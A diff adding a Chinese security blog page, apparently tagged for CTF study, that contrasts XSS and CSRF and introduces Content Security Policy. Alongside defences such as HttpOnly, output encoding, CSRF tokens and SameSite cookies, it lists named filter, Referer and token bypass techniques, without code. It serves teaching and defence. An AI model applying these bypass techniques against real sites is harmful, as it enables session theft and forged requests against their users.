@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="概论本文前半部分从四个角度讨论XSS与CSRF的区别与共性——原理，利用，绕过，防御。更多的站在防守方的角度，通过对比学习的方式更加辩证性的理解两个漏洞。后半部分深入分析防御XSS等一系列前端安全问题的新思路——内容安全策略（CSP），以及一些笔者关于前端安全的一些思考。 漏洞理解web安全基础同源策略从域和授权这两个概念理解同源策略。  域分为域名和端口三个不部分。协议、域名和端口必须全部相同，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一场XSS和CSRF引发的血案">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="概论本文前半部分从四个角度讨论XSS与CSRF的区别与共性——原理，利用，绕过，防御。更多的站在防守方的角度，通过对比学习的方式更加辩证性的理解两个漏洞。后半部分深入分析防御XSS等一系列前端安全问题的新思路——内容安全策略（CSP），以及一些笔者关于前端安全的一些思考。 漏洞理解web安全基础同源策略从域和授权这两个概念理解同源策略。  域分为域名和端口三个不部分。协议、域名和端口必须全部相同，">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-21T13:37:00.000Z">
+<meta property="article:modified_time" content="2023-12-21T19:40:45.411Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一场XSS和CSRF引发的血案</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/12/21/tx%E8%8F%81%E8%8B%B1%E7%8F%AD%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/12/19/%E5%96%9D%E9%85%92%E4%B8%BA%E4%BA%86%E9%86%89%EF%BC%8C%E6%8A%BD%E7%83%9F%E4%B8%BA%E4%BA%86%E9%86%92/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&text=一场XSS和CSRF引发的血案"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&is_video=false&description=一场XSS和CSRF引发的血案"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一场XSS和CSRF引发的血案&body=Check out this article: http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&name=一场XSS和CSRF引发的血案&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&t=一场XSS和CSRF引发的血案"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%AE%BA"><span class="toc-number">1.</span> <span class="toc-text">概论</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">漏洞理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-number">2.0.1.</span> <span class="toc-text">web安全基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-session%E6%9C%BA%E5%88%B6"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">Cookie&#x2F;session机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-number">2.0.2.</span> <span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">2.0.3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-1"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">防护</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%B9%E6%AF%94%E5%AD%A6%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">对比学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-2"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-2"><span class="toc-number">3.0.0.4.</span> <span class="toc-text">防护</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP"><span class="toc-number">4.</span> <span class="toc-text">CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81"><span class="toc-number">4.0.1.</span> <span class="toc-text">威胁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">防止XSS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85%E5%97%85%E6%8E%A2%E6%94%BB%E5%87%BB"><span class="toc-number">4.0.1.2.</span> <span class="toc-text">缓解数据包嗅探攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8CSP"><span class="toc-number">4.0.2.</span> <span class="toc-text">使用CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Content-Security-Policy%E6%96%B9%E5%BC%8F%E4%B8%BE%E4%BE%8B"><span class="toc-number">4.0.2.1.</span> <span class="toc-text">Content-Security-Policy方式举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#meta%E6%A0%87%E7%AD%BE%E4%B8%BE%E4%BE%8B"><span class="toc-number">4.0.2.2.</span> <span class="toc-text">meta标签举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-number">4.0.2.3.</span> <span class="toc-text">指令说明：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="toc-number">4.0.3.</span> <span class="toc-text">绕过CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#location-href"><span class="toc-number">4.0.3.1.</span> <span class="toc-text">location.href</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Iframe%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.2.</span> <span class="toc-text">Iframe绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jsonp%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.3.</span> <span class="toc-text">jsonp绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CDN%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.4.</span> <span class="toc-text">CDN绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SVG%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.5.</span> <span class="toc-text">SVG绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CRLF%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.6.</span> <span class="toc-text">CRLF绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.0.3.7.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.0.3.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">关于前端安全的一些思考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        一场XSS和CSRF引发的血案
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-21T13:37:00.000Z" class="dt-published" itemprop="datePublished">2023-12-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/web%E5%9F%BA%E7%A1%80/">web基础</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><p>本文前半部分从四个角度讨论XSS与CSRF的区别与共性——原理，利用，绕过，防御。更多的站在防守方的角度，通过对比学习的方式更加辩证性的理解两个漏洞。后半部分深入分析防御XSS等一系列前端安全问题的新思路——内容安全策略（CSP），以及一些笔者关于前端安全的一些思考。</p>
+<h1 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h1><h3 id="web安全基础"><a href="#web安全基础" class="headerlink" title="web安全基础"></a>web安全基础</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h4><p>从域和授权这两个概念理解同源策略。</p>
+<ul>
+<li>域分为域名和端口三个不部分。协议、域名和端口必须全部相同，才属于同源</li>
+<li>通常情况下，不同域之间是不能相互访问资源的。只有被访问域的响应头中包含相关的origin，才会给相应的域授权访问。即通过origin可以拒绝授权某些跨域请求</li>
+</ul>
+<p>也就是说：同源策略分割和保护了Web 资源，通过限制非同域资源的访问，有效的阻止了攻击者的窃取和破坏行为</p>
+<h4 id="Cookie-session机制"><a href="#Cookie-session机制" class="headerlink" title="Cookie&#x2F;session机制"></a><strong>Cookie&#x2F;session机制</strong></h4><p>这两个机制都是常用的会话跟踪技术。session 机制与 Cookie 机制不同的是，Cookie 是<strong>客户端</strong>机制，而 Session 则是<strong>服务端</strong>机制。在实际 Web 应用中，会话机制通常作为一种认证用户身份的手段。因此也是各大攻击场景中的首要攻击目标。</p>
+<hr>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>跨站脚本攻击：<code>攻击者脚本</code> 嵌入 <code>被攻击网站</code>，获取用户cookie等隐私信息。</p>
+<p>攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。</p>
+<p>分类主要是：反射型、存储型、DOM型</p>
+<blockquote>
+<p> 反射型：应用程序从请求中获取一些输入并以不安全的方式将该输入嵌入到<strong>即时响应</strong>中</p>
+</blockquote>
+<p>特点：</p>
+<ul>
+<li>即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；</li>
+<li>攻击者需要诱骗点击；</li>
+<li>反馈率低，所以较难发现和响应修复；</li>
+<li>盗取用户敏感保密信息</li>
+</ul>
+<blockquote>
+<p>存储型：攻击脚本将被<strong>永久地存放在目标服务器</strong>端（数据库，内存，文件系统等）</p>
+</blockquote>
+<p>特点：</p>
+<ul>
+<li>持久性，植入在数据库中；</li>
+<li>危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；</li>
+<li>盗取用户敏感私密信息。</li>
+</ul>
+<blockquote>
+<p>DOM型：DOM XSS直接通过javascript执行，程序并不会返回后台进行处理。</p>
+</blockquote>
+<p>特点：</p>
+<ul>
+<li>DOM xss属于是前端的安全问题，服务端的防御都无效</li>
+<li>和反射型一样只能通过诱导受害者点击链接</li>
+</ul>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li>大小写绕过</li>
+<li>复写绕过</li>
+<li>使用js事件绕过标签括号等</li>
+<li>编码绕过</li>
+</ul>
+<h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><ul>
+<li><p>设置HttpOnly标志，防止非法用户通过Javascript读取cookie</p>
+</li>
+<li><p>Web 页面渲染的所有内容或者渲染的数据都尽量来自于服务端；</p>
+</li>
+<li><p>尽量不要从  URL，document.referrer，document.forms 等这种 API 中获取数据直接渲染；</p>
+</li>
+<li><p>前端渲染的时候对字段做转义编码（htmlencode，jsencode），特别是一些高频利用字段（&lt;,&gt;，”,’）</p>
+</li>
+<li><p>白名单-使用第三方库XSS，支持指定白名单</p>
+</li>
+<li><p>输入验证，对输入的数据进行严格的转义和编码，过滤</p>
+<ul>
+<li>将不可信数据插入到HTML URL里时，对这些数据进行URL编码</li>
+<li>对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload）等进行Javascript编码。</li>
+<li>往 HTML 标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行 HTML Entity 编码 HTML 字符实体</li>
+</ul>
+</li>
+<li><p>服务端的输出检查，使用编码或转义的方式来防御 XSS 攻击。</p>
+<ul>
+<li>例如利用sanitize-html对输出内容进行有规则的过滤之后再输出到页面中。</li>
+</ul>
+</li>
+<li><p>输入长度限制</p>
+</li>
+</ul>
+<hr>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>跨站请求伪造：<code>已登录用户</code> 访问 <code>攻击者网站</code>，攻击网站向被攻击网站发起恶意请求（利用浏览器会自动携带cookie）。</p>
+<p>用户在一个没有保护的网站下处于登录状态，并在不知情的情况下用同一个浏览器访问了攻击者发来含 有恶意代码的网址，导致攻击者使用了用户的身份（cookie）在网站中执行恶意操作</p>
+<p>分类主要是：GET型、POST型</p>
+<blockquote>
+<p>GET型</p>
+</blockquote>
+<p>攻击者直接诱导受害者恶意的URL链接，如果服务器没有对该请求做判断的话，就会自动发起GET请求从而利用受害者身份进行一系列操作。</p>
+<blockquote>
+<p>POST型</p>
+</blockquote>
+<p>攻击者需要在他的站点上伪造 POST 请求，当用户打开该站点时，自动提交 POST 请求。</p>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li>Referer源绕过<ul>
+<li>置空：删除referer内容</li>
+<li>子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 httpx:&#x2F;&#x2F;baidu.weiyigeek.com 我们让baidu变成子域名这样就绕过了比较弱的正则了</li>
+<li>修改域名：如果原来的的 httpx:&#x2F;&#x2F;dafsec.weiyigeek.org ，那么可以改成</li>
+<li>httpx:&#x2F;&#x2F;adafsec.weiyigeek.org</li>
+<li>删除 X-CSRFToken 报头然后将POST请求改为GET</li>
+</ul>
+</li>
+<li>Token Bypass<ul>
+<li>删除Token参数字段  </li>
+<li>替换相同长度的值</li>
+<li>解码CSRF令牌</li>
+<li>仅使用令牌的静态部分</li>
+<li>配合XSS等html注入手法获取token，随机发动CSRF攻击</li>
+</ul>
+</li>
+<li>X-Request-with Bypass<ul>
+<li>利用swf进行绕过</li>
+<li>前提条件：<ul>
+<li>可利用swf未校验referer和origin 的bypass 含json xml格式的数据， </li>
+<li>可使用swf添加X-Request-With</li>
+</ul>
+</li>
+<li>工具： httpx:&#x2F;&#x2F;github.com&#x2F;Qclover&#x2F;CSRF</li>
+</ul>
+</li>
+<li>旁路cookie注入绕过 <ul>
+<li>描述：攻击者可以通过cookie注入绕过双重提交cookie保护<ul>
+<li>cookie注入的方法: CRLF-injection (HTML响应拆分注入漏洞) </li>
+<li>Browser bugs (like CVE-2016-9078 in Firefox)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h4><blockquote>
+<p>原理</p>
+</blockquote>
+<p>CSRF攻击防御的重点是利用cookie的值只能被第一方读取，无法读取第三方的cookie值：</p>
+<p>一个简单可行的方法就是在客户端网页上再次添加一个cookie，保存一个随机数，而用户访问的时候，先读取这个cookie的值，hash一下这个cookie值并发送给服务器，服务器接收到用户的hash之后的值，同时取出之前设置在用户端的cookie的值，用同样的算法hash这个cookie值，比较这两个hash值，相同则是合法。（如果用户访问了病毒网站，也想带这个cookie去访问的时候，此时，因为病毒网站无法获取第三方cookie的值，所以他也就无法hash这个随机数，所以也就会被服务器校验的过滤掉）</p>
+<blockquote>
+<p>具体防御方法</p>
+</blockquote>
+<ul>
+<li><p>验证 HTTP Referer 字段；</p>
+</li>
+<li><p>在请求地址中添加完备的 token 并验证；</p>
+</li>
+<li><p>在 HTTP 头中自定义属性并验证</p>
+<ul>
+<li><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的 形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest </p>
+<p>这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入 其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求 的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中 去。</p>
+</li>
+</ul>
+</li>
+<li><p>Chrome 浏览器端启用 SameSite cookie，也就是禁用第三方cookie。或者开发时使用SameSite并设置为strict</p>
+</li>
+<li><p>使用验证码，验证码会强制用户必须与应用进行交互，才能完成最终请求。是的用户无法在不知觉的情况下进行恶意操作</p>
+</li>
+</ul>
+<h1 id="对比学习"><a href="#对比学习" class="headerlink" title="对比学习"></a>对比学习</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF和XSS都是客户端攻击，它们<strong>滥用同源策略</strong>，利用web应用程序和受害用户之间的信任关系。从而利用受害者的身份或Cookie信息进行其他操作。</p>
+<p>但是，XSS 和 CSRF 攻击之间存在一些原理上的差异：</p>
+<p>XSS产生原因类似于SQL注入，源于用户输入的数据被当成了代码执行，而CSRF产生原因更像是浏览器为了增加用户的使用体验弱化一些跨域和第三方Cookie登录的验证。</p>
+<p>所以本质上讲，XSS 是<strong>代码注入</strong>问题，属于’攻击’，CSRF 是 <strong>HTTP</strong> 问题，属于’伪造’</p>
+<p>XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行，算是一个漏洞层面问题。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie 里面，算是一个关于http和浏览器设计机制层面的问题。</p>
+<p>其次，XSS 利用的是用户对指定网站的信任，恶意代码存储在站点中，CSRF 利用的是网站对用户网页浏览器的信任，恶意代码存储在受害用户访问的第三方站点中。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul>
+<li>XSS通过诱导受害者点击恶意链接或诱导服务器恶意渲染恶意代码来窃取登录信息、cooki、执行服务端命令等。而CSRF则是通过受害者点击恶意链接，重点是利用其身份发起一系列HTTP请求。二者都能到到啊一种类似于越权的效果。</li>
+<li>CSRF攻击的范围有限，仅限于用户可以执行的操作，例如点击恶意链接或访问恶意网站。相反，XSS攻击提供执行恶意脚本来执行攻击者所选择的任何活动，扩大了攻击的范围。</li>
+<li>XSS攻击遵循双向攻击模式，允许攻击者执行恶意脚本、访问响应，并将后续敏感数据发送到攻击者选择的目的地。而CSRF是一种单向攻击机制，这意味着攻击者只能发起HTTP请求，但不能检索已发起请求的响应。</li>
+</ul>
+<h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><p>XSS主要是通过绕过网站对输入的编码，黑名单等限制，从而成功的把代码注入进客户端或者存储进服务器中。而CSRF要考虑的首要问题是解决浏览器第三方cookie访问的问题，通过Refer源Bypass，Token Bypass，X-Request-with Bypass等绕过浏览器和服务器的检查从而实现跨站的请求伪造。</p>
+<h4 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h4><p>XSS防护主要是降低用户端对服务端之间的双向信任，加强对用户输入和服务端输出的校验。主要手段是加强各种编码和转义，添加黑白名单，使用Http only等。</p>
+<p>而CSRF防护主要是解决浏览器第三方cookie访问限制的问题，具体方法是添加HTTP Referer 字段验证， 添加HTTP 头中自定义属性防护，使用完备的 token，启用 SameSite cooki，使用验证码等。</p>
+<h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><strong>内容安全策略 CSP</strong>（Content-Security-Policy）是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等。</p>
+<p>CSP 被设计成完全向后兼容（除 CSP2 在向后兼容有明确提及的不一致; ）。不支持 CSP 的浏览器也能与实现了 CSP 的服务器正常工作，反之亦然：不支持 CSP 的浏览器只会忽略它，如常运行，默认为网页内容使用标准的同源策略。如果网站不提供 CSP 标头，浏览器也使用标准的同源策略。</p>
+<h3 id="威胁"><a href="#威胁" class="headerlink" title="威胁"></a>威胁</h3><h4 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h4><p>XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行。</p>
+<p>CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本（包括内联脚本和 HTML 的事件处理属性）。</p>
+<p>作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。</p>
